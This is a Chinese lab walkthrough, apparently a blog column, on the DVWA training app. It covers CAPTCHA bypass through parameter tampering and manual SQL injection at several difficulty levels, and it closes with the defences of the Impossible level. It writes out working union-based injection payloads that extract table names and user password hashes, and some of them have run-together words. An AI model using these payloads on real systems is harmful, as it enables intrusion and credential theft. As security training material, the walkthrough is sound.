上篇介绍File Inclusion和File Upload，该篇继续Insecure CAPTCHE和SQL Injection。

##  

## Insecure CAPTCHE

Insecure
CAPTCHE，意思是不安全的验证码，或者不安全的验证流程。这里使用的是谷歌的验证服务，首先申请该服务的API，获得公私钥对，这里需要自己申请，由于我们只是验证是否可以绕过验证，所以在config.inc.php中我们随意输入公私钥即可。这里的验证过程，首先向谷歌发送服务器发送请求验证码（利用公钥），返回验证码之后输入验证码给服务器，服务器利用私钥、用户IP、验证码等向谷歌验证验证码，然后谷歌返回结果。

### 8.1 Low等级

8.1.1 漏洞分析

设置为Low等级，查看源码可以发现，服务器将改密操作分成两步，第一步是验证验证码是否正确，源码如下

![image.png](https://image.3001.net/images/20200316/1584364154_5e6f7a7a967fc.png!small)

第二步是在第一步验证成功且密码相同后返回表单，提交Post请求，完成修改密码的操作。

8.1.2 修改step绕过验证码认证过程

我们可以将请求拦截，拦截如下

![image.png](https://image.3001.net/images/20200316/1584364308_5e6f7b14f138b.png!small)

这里将step参数改为2，则可以直接绕过，完成修改密码请求。

![image.png](https://image.3001.net/images/20200316/1584364323_5e6f7b2316138.png!small)

8.1.3 利用CSRF绕过验证

我们已经得到只要发送step=2以及修改密码的表单就可以直接绕过验证码输入，然后修改密码，这里我们可以伪造一个提交step=2的修改密码表单的网页，具体的页面如下，这里不做具体操作，只提供思路。

![image.png](https://image.3001.net/images/20200316/1584364985_5e6f7db9806c4.png!small)

### 8.2 Medium等级

8.2.1 漏洞分析

设置为Medium等级，我们可以发现源码部分第二步POST请求增加了对第一步的验证结果参数。

![image.png](https://image.3001.net/images/20200316/1584365007_5e6f7dcff0e5e.png!small)

8.2.2 利用添加passed_captcha参数绕过验证

拦截修改请求，结果如下

![image.png](https://image.3001.net/images/20200316/1584365029_5e6f7de5a0759.png!small)

将此处修改为step=2，并添加passed_captcha字段，修改如下

![image.png](https://image.3001.net/images/20200316/1584365042_5e6f7df27e8e3.png!small)

得到结果为

![image.png](https://image.3001.net/images/20200316/1584365048_5e6f7df8d4a00.png!small)

当然依然可以利用CSRF进行修改，只需要在构造页面添加passed_captcha参数即可，这里不再累述。

### 8.3 High等级

8.3.1 漏洞分析

设置为High等级，源码修改如下，这里采用一次请求来进行修改密码，而且确定了验证失败的条件是返回为false，并且请求满足一定条件。

![image.png](https://image.3001.net/images/20200316/1584365062_5e6f7e065802d.png!small)

8.3.2 利用修改参数来避免触发验证失败条件

这里我们无法决定验证码返回的结果，所以要想避开失败情况，则需要&&后面为假，则需要设置recaptcha_response_field为hidd3n_valu3、HTTP_USER_AGENT为reCAPTCHA即可，拦截修改请求，截取如下

![image.png](https://image.3001.net/images/20200316/1584365094_5e6f7e2605091.png!small)

修改User-Agent，并添加recaptcha_response_field字段，修改如下

![image.png](https://image.3001.net/images/20200316/1584365106_5e6f7e329f984.png!small)

得到如下结果，说明漏洞存在

![image.png](https://image.3001.net/images/20200316/1584365152_5e6f7e60cd015.png!small)

### 8.4 Impossible等级

设置为Impossible等级，源码如下，增加了Anti-CSRF
token，增加了原密码选项，并且采用PDO机制防止注入，而且验证采用一步且无法绕过，进一步加强了身份认证。

![image.png](https://image.3001.net/images/20200316/1584365166_5e6f7e6e1e2d8.png!small)

## SQL Injection

SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入危害是巨大的，常常会导致整个数据库的脱库。

### 9.1 Low等级

9.1.1 漏洞分析

设置为Low等级，源码如下，可以看到没有对id做任何过滤，所以存在SQL注入。

![image.png](https://image.3001.net/images/20200316/1584365191_5e6f7e8759778.png!small)

9.1.2 手动注入

我们在查看源码的基础上，可以确定其存在SQL注入漏洞，但是实际情况下，并不能看到源码，所以需要判断是否存在注入漏洞。输入1得到下面结果

![image.png](https://image.3001.net/images/20200316/1584365206_5e6f7e966ea52.png!small)

输入1' or '1'='1得到整个列表，截图如下，证明为字符型注入

![image.png](https://image.3001.net/images/20200316/1584365215_5e6f7e9fbefbf.png!small)

因为返回了多个结果，这里我们需要确定查询的字段数，这里使用order by，order
by是以某一列（字段）对搜索的结果进行排序，后面可以跟数字或者列表名字来进行排序，这里我们显然不知道列表字段，所以使用数字。

依次输入一下命令1' order by 2 #，1'order by 3 #。发现1' order by 2 #返回结果，而1' order by 3
#报错，则证明查询字段只有两列，截图如下。

![image.png](https://image.3001.net/images/20200316/1584365263_5e6f7ecf802c3.png!small)

![image.png](https://image.3001.net/images/20200316/1584365268_5e6f7ed44105a.png!small)

确定了字段数，可以确定下字段的顺序，union是联合查询的意思，前面已经查询出两个字段，结合1' union select 1,2
#根据1,2的位置可以确定字段显示的顺序，这里不太理解，输入结果如下

![image.png](https://image.3001.net/images/20200316/1584365508_5e6f7fc41b396.png!small)

之后可以利用sql命令获取当前数据库1' union select database(),2 #，得到数据库名称

![image.png](https://image.3001.net/images/20200316/1584365538_5e6f7fe273f3d.png!small)

在已知数据库名字后，可以查询数据库下的表名字，使用如下命令，这里的group_concat是把查询到的值放到一起，显示在一行内，如果不加这个则会没查询出一个值，显示一行。

1' union select group_concat(table_name),2 from information_schema.tables
wheretable_schema=database() #

![image.png](https://image.3001.net/images/20200316/1584365836_5e6f810c3257a.png!small)

可以得到数据库中有两张表guestbook和users。

这里查询users表格中的字段名，输入如下

1' union select group_concat(column_name),2 from information_schema.columns
wheretable_name='users' #

![image.png](https://image.3001.net/images/20200316/1584366061_5e6f81ed7431c.png!small)

可以得到users的字段名有user_id，first_name，last_name，user，password，avatar，last_login，failed_login，USER，CURRENT_CONNECTIONS，TOTAL_CONNECTIONS。

查询用户和密码字段，输入如下命令

1' union select user,password from users #

可以看到password以加密形式显示，一般为md5摘要，仍然可以破解，这样就拿到了用户和密码，证明SQL注入漏洞存在，结果如下

![image.png](https://image.3001.net/images/20200316/1584366088_5e6f8208a3438.png!small)  

### 9.2 Medium等级

9.2.1 漏洞分析

设置为Medium等级，源码修改如下，这里发现使用了mysqli_real_escape_string函数，对特殊符号\x00、\n、\r、\、'、"、\x1a进行转义，同时前端设立下拉页面，不允许输入。

![image.png](https://image.3001.net/images/20200316/1584366109_5e6f821d0ed9d.png!small)

9.2.2 手动注入

我们可以通过拦截请求页面，来实现参数修改，绕过下拉页面的限制。结果如下

![image.png](https://image.3001.net/images/20200316/1584366115_5e6f8223c346f.png!small)

所以我们可以通过修改id来进行尝试。分别使用1' or 1=1 #和1 or 1=1 #进行尝试，查看结果，发现返回结果，1' or 1=1
#报错，截图如下，说明存在数字型注入

![image.png](https://image.3001.net/images/20200316/1584366125_5e6f822d69ace.png!small)

![image.png](https://image.3001.net/images/20200316/1584366141_5e6f823d77639.png!small)

修改参数为1 order by 2 #或者1 order by 3 #查看查询字段数，得到1order by 2 #返回结果，1 order by 2
#报错，所以确定查询字段数为2。截图如下

![image.png](https://image.3001.net/images/20200316/1584366202_5e6f827a8f0b5.png!small)

使用1 union select 1,2 #确定字段显示的顺序，即1位置的查询结果显示在哪个字段下，结果显示1位置显示在First name字段，截图如下

![image.png](https://image.3001.net/images/20200316/1584366211_5e6f828317c57.png!small)

利用1 union select 1,database() #获取数据库名称，结果如下

![image.png](https://image.3001.net/images/20200316/1584366225_5e6f8291cce60.png!small)

获取dvwa数据库中的表名，将id参数设置为如下

1 union select 1,group_concat(table_name) from information_schema.tables
wheretable_schema=database() #

得到表名guestbook，users，截图如下

![image.png](https://image.3001.net/images/20200316/1584366241_5e6f82a12b614.png!small)

获取users表中的字段数，将id参数设置为如下

1 union select 1,group_concat(column_name) from information_schema.columns
wheretable_name='users' #

得到字段为，截图如下

![image.png](https://image.3001.net/images/20200316/1584366249_5e6f82a925b09.png!small)

这里'被转义为\'所以SQL语句无法执行。由于在SQL语句中字符串类型必须要加引号，但是数值型不需要加引号，所以可以将users改为十六进制进行绕过，这样就不需要加引号了。将id参数修改为如下

id=1 union select 1,group_concat(column_name) from information_schema.columns
wheretable_name=0x7573657273 #

得到表单字段user_id、first_name、last_name、user、password、avatar、last_login、failed_login、USER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS。结果如图所示

![image.png](https://image.3001.net/images/20200316/1584366277_5e6f82c562a2c.png!small)

之后查询user和password字段，或者其他想要的字段都可以实现，将参数id设置为如下

1 union select user,password from users #

得到md5加密的密码和对应用户名，证明漏洞存在。

![image.png](https://image.3001.net/images/20200316/1584366290_5e6f82d277141.png!small)  

### 9.3 High等级

9.3.1 漏洞分析

设置为High等级，源码修改如下，增加了LIMIT
1，每次查询只返回一条数据。并且输入页面和结果响应页面不是同一个，也没有执行跳转，这样可以防止一般的sqlmap注入，因为sqlmap在注入过程中，无法再查询提交页面上获取查询的结果，也就没办法注入。

![image.png](https://image.3001.net/images/20200316/1584366345_5e6f83098d286.png!small)

9.3.2 手动注入

虽然在sql语句加了LIMIT 1，但是我们可以直接在后面加#将其注释掉，所以其步骤和Low等级基本一致。这里直接将输入数据和结果输出。

Session ID: 1' or 1=1 #

![image.png](https://image.3001.net/images/20200316/1584366368_5e6f8320df223.png!small)

Session ID: 1' order by2 #

![image.png](https://image.3001.net/images/20200316/1584366376_5e6f832841911.png!small)

Session ID: 1' order by3 #

![image.png](https://image.3001.net/images/20200316/1584366382_5e6f832e615d5.png!small)

Session ID: 1' unionselect 1,2 #

![image.png](https://image.3001.net/images/20200316/1584366388_5e6f833428a85.png!small)

Session ID: 1' unionselect 1,database() #

![image.png](https://image.3001.net/images/20200316/1584366394_5e6f833a6f740.png!small)

Session ID: 1' union select1,group_concat(table_name) from
information_schema.tables wheretable_schema=database() #

![image.png](https://image.3001.net/images/20200316/1584366400_5e6f8340ba5ec.png!small)

Session ID: 1' unionselect group_concat(column_name),2 from
information_schema.columns wheretable_name='users' #

![image.png](https://image.3001.net/images/20200316/1584366406_5e6f834671556.png!small)

Session ID: 1' unionselect user,password from users #

![image.png](https://image.3001.net/images/20200316/1584366411_5e6f834b953a7.png!small)

### 9.4 Impossible等级

设置为Impossible等级，查看源码如下。采用Anti-CSRF
token防止CSRF攻击，判断id是否为数字，采用PDO技术将sql查询语句和参数分开，并且只有返回的查询结果是1的时候才会输出。

![image.png](https://image.3001.net/images/20200316/1584366436_5e6f8364c712c.png!small)

  

更多内容请持续关注本专栏，谢谢~

